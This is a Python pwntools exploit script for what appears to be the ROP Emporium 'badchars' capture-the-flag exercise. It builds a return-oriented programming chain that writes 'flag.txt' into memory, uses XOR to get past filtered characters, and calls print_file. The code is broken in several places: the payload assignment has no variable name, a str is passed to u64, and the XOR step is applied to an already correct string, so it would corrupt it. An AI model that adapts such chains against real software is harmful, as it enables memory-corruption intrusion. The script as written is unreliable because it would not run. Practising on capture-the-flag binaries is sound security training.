from pwn import *
import os

os.environ["SHELL"] = '/bin/sh'

context.binary = elf = ELF('./badchars')
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['st', '--', '/bin/sh', '-c']

offset = 40

# elements of ROP chain
r_return = 0x4004ee

# a place to store the "flag.txt" string
bss_addr = elf.bss()

print_file = elf.plt['print_file']

pop_rdi = 0x4006a3
pop_r12_r13_r14_r15 = 0x40069c
mov_r13_r12 = 0x400634

# these elements are for correcting the "flag.txt" string in bss using xor

xor_r15_r14b = 0x400628
pop_r14_r15 = 0x4006a0
# modifiers that will result in the correct characters when the xor instruction is applied
a = 0x8a
g = 0x8c 
dot = 0xc5
x = 0x93

flag = "flag.txt"

dummy_data = 0x696969


 = flat(
        b'b' * offset,
        p64(pop_r12_r13_r14_r15),
        u64(flag),
        p64(bss_addr),
        p64(dummy_data),
        p64(dummy_data),
        p64(mov_r13_r12),
        # correcting the string
        p64(pop_r14_r15),
        p64(a),
        p64(bss_addr+2),
        p64(xor_r15_r14b),
        p64(pop_r14_r15),
        p64(g),
        p64(bss_addr+3),
        p64(xor_r15_r14b),
        p64(pop_r14_r15),
        p64(dot),
        p64(bss_addr+4),
        p64(xor_r15_r14b),
        p64(pop_r14_r15),
        p64(x),
        p64(bss_addr+6),
        p64(xor_r15_r14b),
        # running print_file
        p64(pop_rdi),
        p64(bss_addr),
        p64(print_file),
        )

gdb_script = '''
        break *pwnme+267
        continue
    '''

#io = gdb.debug(elf.path, gdbscript=gdb_script)
io = elf.process()

print("OFFSET: ", offset)
pause()

print(io.recv().decode())

#io.sendline(find_offset)
io.sendline(payload)

pause()

print(io.recv())

pause()
